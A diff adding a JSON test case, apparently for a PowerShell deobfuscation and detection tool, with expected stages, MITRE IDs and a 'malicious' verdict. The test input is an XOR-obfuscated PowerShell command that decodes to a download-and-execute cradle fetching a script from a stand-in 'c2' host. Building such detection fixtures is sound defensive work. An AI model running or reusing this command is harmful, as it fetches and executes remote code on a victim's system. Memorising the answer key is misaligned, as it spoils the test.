@@ -1,0 +1,46 @@
+{
+  "id": "xor-multi-0",
+  "category": "ps-crypto",
+  "algorithm": "XOR-multi",
+  "command_line": "$k=[Text.Encoding]::UTF8.GetBytes('NivXor2026'); $c=[byte[]](7,44,46,120,71,60,87,71,31,121,44,3,19,59,27,82,124,85,70,24,25,12,20,27,3,27,87,94,70,31,96,45,25,47,1,30,93,81,86,101,58,27,31,54,8,90,21,88,70,66,62,83,89,119,12,64,29,72,28,70,61,88,81,113); $out=[byte[]]::new($c.Length); for($i=0;$i -lt $c.Length;$i++){$out[$i] = $c[$i] -bxor $k[$i % $k.Length]}; IEX ([Text.Encoding]::UTF8.GetString($out))",
+  "stage_ladder": [
+    {
+      "name": "utf8-key",
+      "recoverable": true,
+      "reason": ""
+    },
+    {
+      "name": "byte-array-parse",
+      "recoverable": true,
+      "reason": ""
+    },
+    {
+      "name": "xor-multi-inline-key",
+      "recoverable": true,
+      "reason": ""
+    },
+    {
+      "name": "utf8-decode",
+      "recoverable": true,
+      "reason": ""
+    }
+  ],
+  "key_status": "inline-static",
+  "expected_plaintext": "IEX (New-Object Net.WebClient).DownloadString('http://c2/x.ps1')",
+  "expected_iocs": [
+    "IEX (New-Object Net.WebClient).DownloadString('http://c2/x.ps1')"
+  ],
+  "expected_lolbins": [
+    "powershell.exe"
+  ],
+  "expected_mitre": [
+    "T1027",
+    "T1059.001",
+    "T1140"
+  ],
+  "expected_verdict": "malicious",
+  "expected_confidence_min": 0.85,
+  "notes": "",
+  "source": "nivxray-rc41-crypto",
+  "license": "CC-BY-4.0"
+}
